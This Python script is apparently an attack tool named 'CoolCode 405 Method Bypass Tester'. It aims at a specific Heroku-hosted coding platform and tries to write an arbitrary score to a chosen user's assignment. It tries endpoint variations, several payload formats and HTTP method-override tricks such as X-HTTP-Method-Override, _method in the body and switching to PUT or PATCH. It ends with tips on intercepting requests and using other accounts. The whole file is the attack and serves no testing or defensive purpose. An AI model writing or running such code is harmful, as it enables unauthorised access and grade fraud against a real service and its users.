#!/usr/bin/env python3
"""
CoolCode API Method Tester
Specifically designed to handle 405 Method Not Allowed errors
"""

import requests
import json
from urllib.parse import urljoin

class MethodTester:
    def __init__(self):
        self.base_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
        self.session = requests.Session()
        
    def test_all_methods(self, endpoint, payload=None):
        """Test all HTTP methods on an endpoint"""
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']
        results = {}
        
        print(f"🔍 Testing all methods on: {endpoint}")
        print("-" * 50)
        
        for method in methods:
            try:
                url = urljoin(self.base_url, endpoint)
                
                # Prepare request based on method
                kwargs = {
                    'timeout': 10,
                    'headers': {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'User-Agent': 'CoolCodeHacker/1.0'
                    }
                }
                
                if method in ['POST', 'PUT', 'PATCH'] and payload:
                    kwargs['json'] = payload
                
                response = getattr(requests, method.lower())(url, **kwargs)
                
                status = response.status_code
                content = response.text[:200] + "..." if len(response.text) > 200 else response.text
                
                print(f"{method:7s}: {status} - {content}")
                
                results[method] = {
                    'status': status,
                    'content': content,
                    'headers': dict(response.headers)
                }
                
                # If we get 200, this method works!
                if status == 200:
                    print(f"✅ {method} method works!")
                
            except Exception as e:
                print(f"{method:7s}: ERROR - {str(e)}")
                results[method] = {'error': str(e)}
        
        return results
    
    def test_score_api_variations(self, username, assignment_id=1, score=100):
        """Test different variations of the score API"""
        
        payload = {
            "username": username,
            "assignmentId": assignment_id,
            "score": score
        }
        
        # Different endpoint variations to try
        endpoints = [
            "/api/api/assignment/score",
            "/api/assignment/score", 
            "/assignment/score",
            "/api/score",
            "/score",
            "/api/assignments/score",
            "/api/api/assignments/score",
            "/api/api/assignment/scores",
            "/api/assignment/update",
            "/api/api/assignment/update"
        ]
        
        print(f"🎯 Testing score API variations for user: {username}")
        print(f"📝 Assignment ID: {assignment_id}, Score: {score}")
        print("=" * 60)
        
        for endpoint in endpoints:
            print(f"\n🔍 Testing endpoint: {endpoint}")
            self.test_all_methods(endpoint, payload)
    
    def test_with_different_payloads(self, endpoint, username, assignment_id=1, score=100):
        """Test the same endpoint with different payload formats"""
        
        payloads = [
            # Original format
            {
                "username": username,
                "assignmentId": assignment_id,
                "score": score
            },
            # Alternative field names
            {
                "user": username,
                "assignment": assignment_id,
                "score": score
            },
            {
                "username": username,
                "assignment_id": assignment_id,
                "score": score
            },
            {
                "student": username,
                "assignmentId": assignment_id,
                "grade": score
            },
            # String format
            {
                "username": str(username),
                "assignmentId": str(assignment_id),
                "score": str(score)
            },
            # Nested format
            {
                "assignment": {
                    "id": assignment_id,
                    "score": score
                },
                "user": username
            }
        ]
        
        print(f"🎯 Testing different payload formats on: {endpoint}")
        print("=" * 60)
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n[{i}/{len(payloads)}] Testing payload: {json.dumps(payload, indent=2)}")
            
            try:
                url = urljoin(self.base_url, endpoint)
                response = requests.post(
                    url,
                    json=payload,
                    headers={
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    timeout=10
                )
                
                print(f"Status: {response.status_code}")
                print(f"Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
                
                if response.status_code == 200:
                    print("✅ SUCCESS! This payload format works!")
                    return payload
                    
            except Exception as e:
                print(f"Error: {e}")
        
        return None
    
    def advanced_bypass_test(self, endpoint, payload):
        """Advanced bypass techniques for 405 errors"""
        
        print(f"🚀 Advanced bypass testing on: {endpoint}")
        print("=" * 60)
        
        # Method override techniques
        bypass_techniques = [
            {
                "name": "X-HTTP-Method-Override",
                "headers": {
                    "X-HTTP-Method-Override": "POST",
                    "Content-Type": "application/json"
                },
                "method": "GET"
            },
            {
                "name": "Method Override in Body",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "method": "POST",
                "data": f"_method=POST&data={json.dumps(payload)}"
            },
            {
                "name": "Tunnel through GET with query params",
                "headers": {},
                "method": "GET",
                "params": {
                    "username": payload.get("username"),
                    "assignmentId": payload.get("assignmentId"),
                    "score": payload.get("score")
                }
            },
            {
                "name": "PUT instead of POST",
                "headers": {"Content-Type": "application/json"},
                "method": "PUT",
                "json": payload
            },
            {
                "name": "PATCH instead of POST",
                "headers": {"Content-Type": "application/json"},
                "method": "PATCH", 
                "json": payload
            }
        ]
        
        for technique in bypass_techniques:
            print(f"\n🔧 Trying: {technique['name']}")
            
            try:
                url = urljoin(self.base_url, endpoint)
                
                kwargs = {
                    'timeout': 10,
                    'headers': technique['headers']
                }
                
                if 'json' in technique:
                    kwargs['json'] = technique['json']
                if 'data' in technique:
                    kwargs['data'] = technique['data']
                if 'params' in technique:
                    kwargs['params'] = technique['params']
                
                response = getattr(requests, technique['method'].lower())(url, **kwargs)
                
                print(f"Status: {response.status_code}")
                print(f"Response: {response.text[:150]}{'...' if len(response.text) > 150 else ''}")
                
                if response.status_code == 200:
                    print(f"✅ SUCCESS! {technique['name']} works!")
                    return True
                elif response.status_code != 405:
                    print(f"🔄 Different response code: {response.status_code}")
                    
            except Exception as e:
                print(f"Error: {e}")
        
        return False

def main():
    """Main testing function"""
    print("🔥" * 25)
    print("   CoolCode 405 Method Bypass Tester")
    print("🔥" * 25)
    print()
    
    tester = MethodTester()
    
    # Get user input
    username = input("Enter target username: ").strip()
    if not username:
        username = "CX8de3ce71-3cbTY"
        print(f"Using default username: {username}")
    
    assignment_id = input("Enter assignment ID (default 1): ").strip()
    assignment_id = int(assignment_id) if assignment_id else 1
    
    score = input("Enter score (default 100): ").strip()
    score = int(score) if score else 100
    
    print(f"\n🎯 Target: {username}")
    print(f"📝 Assignment: {assignment_id}")
    print(f"⭐ Score: {score}")
    print()
    
    # Test 1: Try different endpoint variations
    tester.test_score_api_variations(username, assignment_id, score)
    
    print("\n" + "="*60)
    
    # Test 2: Try different payload formats on main endpoint
    main_endpoint = "/api/api/assignment/score"
    working_payload = tester.test_with_different_payloads(main_endpoint, username, assignment_id, score)
    
    print("\n" + "="*60)
    
    # Test 3: Advanced bypass techniques
    test_payload = working_payload or {
        "username": username,
        "assignmentId": assignment_id,
        "score": score
    }
    
    tester.advanced_bypass_test(main_endpoint, test_payload)
    
    print("\n" + "🔥" * 25)
    print("Testing complete!")
    print("💡 If nothing worked, try:")
    print("   - Browser developer tools")
    print("   - Intercepting real requests")
    print("   - Different user accounts")
    print("   - Manual form submission")
    print("🔥" * 25)

if __name__ == "__main__":
    main()
